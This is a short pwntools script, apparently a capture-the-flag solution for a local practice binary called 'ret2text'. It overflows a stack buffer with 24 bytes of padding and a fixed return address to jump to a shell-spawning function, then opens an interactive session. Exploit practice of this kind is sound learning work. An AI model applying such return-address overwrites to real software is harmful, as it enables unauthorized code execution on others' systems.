from pwn import *

p = process("./ret2text")
junk = b'a'*24
shellAddr = 0x401146

p.sendline(junk + p64(shellAddr))
p.interactive()
